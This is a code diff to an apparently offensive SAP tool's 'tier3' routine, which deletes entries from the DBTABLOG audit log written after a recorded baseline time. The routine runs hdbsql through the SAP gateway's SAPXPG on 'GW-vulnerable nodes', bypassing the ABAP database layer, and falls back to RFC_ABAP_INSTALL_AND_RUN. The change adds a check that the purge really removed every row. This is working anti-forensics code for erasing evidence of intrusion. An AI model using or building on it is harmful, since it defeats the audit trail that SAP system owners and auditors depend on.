@@ -1319,7 +1319,8 @@ def tier3_dbtablog_purge(state, node, hold_seconds: float = 30.0,
 
     from sap_dbtablog_purge import (read_baseline_timestamp,
                                        purge_dbtablog,
-                                       purge_dbtablog_via_gw_hdbsql)
+                                       purge_dbtablog_via_gw_hdbsql,
+                                       count_dbtablog_since)
 
     # Step 1 — baseline (sy-datum + sy-uzeit on the SAP server).
     # Captured via RFC regardless of DELETE channel: the SAP server
@@ -1346,6 +1347,14 @@ def tier3_dbtablog_purge(state, node, hold_seconds: float = 30.0,
     #   1. GW SAPXPG → hdbsql  (primary on HANA + GW-vulnerable nodes;
     #      bypasses ABAP DBI entirely)
     #   2. RFC_ABAP_INSTALL_AND_RUN  (fallback; works on any DB)
+    #
+    # GW path is trust-but-verify: the SAPXPG P3 response only
+    # reports the hdbsql process exit, not whether the DELETE
+    # actually touched any rows.  Schema mismatch, auth failure, or
+    # SQL syntax error all produce "process exited" without purging.
+    # After every GW success we RFC-count the remaining rows; if
+    # non-zero (or the verifier itself errors), we silently fall
+    # through to the RFC DELETE path that is guaranteed correct.
     where_txt = (f"LOGDATE/LOGTIME > {base_date} {base_time}")
     is_hana = (getattr(node, "db_type", "") or "").upper() in ("HDB",
                                                                   "HANA")
@@ -1358,13 +1367,33 @@ def tier3_dbtablog_purge(state, node, hold_seconds: float = 30.0,
         else:
             print(f"[*] {sid}: GW SAPXPG → hdbsql DELETE "
                   f"WHERE {where_txt} (all tables) …")
-        purge = purge_dbtablog_via_gw_hdbsql(node, base_date, base_time,
-                                               tabname_filter=tabs)
-        if not purge["ok"]:
+        gw_purge = purge_dbtablog_via_gw_hdbsql(
+            node, base_date, base_time, tabname_filter=tabs)
+        if not gw_purge["ok"]:
             print(f"[!] {sid}: GW path failed "
-                  f"({purge.get('error', '?')}) — falling back to "
+                  f"({gw_purge.get('error', '?')}) — falling back to "
                   f"RFC_ABAP_INSTALL_AND_RUN …")
-            purge = None
+        else:
+            print(f"[*] {sid}: GW DELETE reported success — "
+                  f"verifying via RFC count …")
+            verify = count_dbtablog_since(
+                node, base_date, base_time, tabname_filter=tabs)
+            if not verify["ok"]:
+                print(f"[!] {sid}: GW verify failed "
+                      f"({verify.get('error', '?')}) — falling back "
+                      f"to RFC_ABAP_INSTALL_AND_RUN for safety …")
+            elif verify["count"] > 0:
+                print(f"[!] {sid}: GW DELETE reported success but "
+                      f"RFC verify shows {verify['count']} row(s) "
+                      f"remain — schema mismatch / auth / SQL "
+                      f"error.  Falling back to "
+                      f"RFC_ABAP_INSTALL_AND_RUN …")
+            else:
+                # GW actually purged everything > baseline.
+                gw_purge["remaining_count"] = 0
+                purge = gw_purge
+                print(f"[+] {sid}: GW DELETE verified — 0 rows "
+                      f"remain post-baseline")
 
     if purge is None:
         if tabs:
